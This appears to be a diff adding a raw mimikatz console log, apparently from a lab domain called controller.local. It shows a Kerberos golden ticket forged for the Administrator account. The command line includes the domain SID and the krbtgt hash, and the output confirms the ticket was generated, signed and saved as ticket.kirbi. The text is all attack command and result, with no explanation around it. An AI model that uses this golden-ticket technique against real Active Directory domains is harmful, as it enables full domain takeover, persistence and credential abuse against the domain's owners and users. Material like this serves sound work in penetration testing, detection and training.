@@ -1,0 +1,19 @@
+mimikatz # Kerberos::golden /user:Administrator /domain:controller.local /sid:S-1-5-21-432953485-3795405108-1502158860 /krbtgt:72cd714611b64cd4d5550cd2759db3f6 /id:502
+User      : Administrator
+Domain    : controller.local (CONTROLLER)
+SID       : S-1-5-21-432953485-3795405108-1502158860
+User Id   : 502
+Groups Id : *513 512 520 518 519
+ServiceKey: 72cd714611b64cd4d5550cd2759db3f6 - rc4_hmac_nt
+Lifetime  : 6/24/2022 3:44:53 AM ; 6/21/2032 3:44:53 AM ; 6/21/2032 3:44:53 AM
+-> Ticket : ticket.kirbi
+
+ * PAC generated
+ * PAC signed
+ * EncTicketPart generated
+ * EncTicketPart encrypted
+ * KrbCred generated
+
+Final Ticket Saved to file !
+
+mimikatz #
